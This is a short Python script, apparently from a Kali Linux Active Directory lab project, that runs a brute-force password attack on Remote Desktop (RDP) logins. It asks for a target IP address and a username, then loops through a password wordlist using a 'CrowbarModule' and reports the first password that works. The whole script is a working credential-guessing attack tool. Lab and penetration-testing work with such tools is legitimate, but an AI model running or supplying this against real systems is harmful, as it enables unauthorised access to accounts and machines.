import sys
import os

# Add the 'modules' directory to Python's import path
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))

from rdp import CrowbarModule  # Now imports from modules/rdp.py

mod = CrowbarModule()

ip = input("Enter target IP address: ")
username = input("Enter username: ")

with open("/home/kali/Desktop/ad-project/passwords.txt", "r") as f:
    for line in f:
        password = line.strip()
        if not password:
            continue
        success = mod.run(ip, username, password)
        if success:
            print(f"[+] RDP-SUCCESS: {username}@{ip} with password '{password}'")
            break
        else:
            print(f"[-] RDP-FAILURE: {username}@{ip} with password '{password}'")

